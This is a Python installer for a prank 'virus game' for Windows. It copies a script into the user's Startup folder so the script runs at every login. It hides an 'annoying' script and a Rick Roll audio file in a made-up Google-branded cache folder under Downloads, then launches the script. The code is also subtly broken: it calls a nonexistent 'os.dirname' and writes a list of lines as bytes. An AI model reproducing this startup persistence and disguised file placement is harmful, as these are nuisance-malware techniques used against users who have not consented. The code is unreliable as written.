import sys
import os
import subprocess

PYTHON_COMMAND = sys.executable

def copyfile(source, dest):
    if not os.path.exists(source):
        print(f"Failed to copy {source} to {dest}:\n Source doesn't exist.")
        return
    if os.path.exists(dest):
        print(f"Failed to copy {source} to {dest}:\n Destination already exists.")
        return
    with open(source, "rb") as f:
        content = f.readlines()
    with open(dest, "wb") as f:
        f.write(content)




if sys.platform != "win32":
    print("This project is ment to run on windows only. It may break non-windows systems.\nExiting...")
    exit()

curr_location = os.dirname(__file__)
home_dir = os.path.expanduser("~")
shell_startup_dir = "/dev/null/"

if sys.platform == "win32":
    shell_startup_dir = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

file_table = [
    (f"{curr_location}/src/virus_game_startup.py", f"{shell_startup_dir}/virus_game_startup.py", False),
    # (f"{curr_location}/src/virus_game_startup.py", f"{curr_location}/test/virus_game_startup_copy.py")
    (f"{curr_location}/src/youtube_com-watch-dQw4w9WgXcQ.mp3", f"{home_dir}/Downloads/Google_Stable_x64/assets/cache/youtube_com-watch-dQw4w9WgXcQ.mp3", True),
    (f"{curr_location}/src/annoying.py", f"{home_dir}/Downloads/Google_Stable_x64/assets/cache/youtube_com.py", True),
    # (f"{curr_location}/src/youtube_com-watch-dQw4w9WgXcQ.mp3", f"{home_dir}/Downloads/Google_Stable_x64/assets/cache/youtube_com-watch-dQw4w9WgXcQ.mp3", True)
]

for source, dest, makedirs in file_table:
    if not os.path.exists(source):
        print(f"Failed to copy {source} to {dest}:\n Source doesn't exist.")
        continue
    if os.path.exists(dest):
        print(f"Failed to copy {source} to {dest}:\n Destination already exists.")
        continue
    if makedirs and not os.path.isdir(os.path.dirname(dest)):
        os.makedirs(os.path.dirname(dest))
    
    copyfile(source, dest)

subprocess.Popen([PYTHON_COMMAND, f"{shell_startup_dir}/virus_game_startup.py"])